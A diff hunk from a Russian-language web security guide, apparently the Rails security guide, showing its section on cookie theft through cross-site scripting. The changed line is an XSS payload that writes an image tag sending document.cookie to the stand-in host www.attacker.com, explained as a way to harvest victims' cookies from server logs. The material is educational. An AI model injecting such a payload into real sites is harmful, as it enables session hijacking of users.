@@ -142,7 +142,7 @@ h6. Похищение куки
 Для злоумышленника, разумеется, бесполезно, что жертва видит свои куки. Следующий пример пытается загрузить изображение с URL http://www.attacker.com/ плюс куки. Конечно, этот URL не существует, поэтому браузер ничего не отобразит. Но злоумышленник сможет просмотреть логи доступа к своему веб серверу, чтобы увидеть куки жертв.
 
 <html>
-<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
+<script>document.write('<img src="http://www.attacker.com/' <plus> document.cookie <plus> '">');</script>
 </html>
 
 Лог файлы  на www.attacker.com будут подобны следующему:
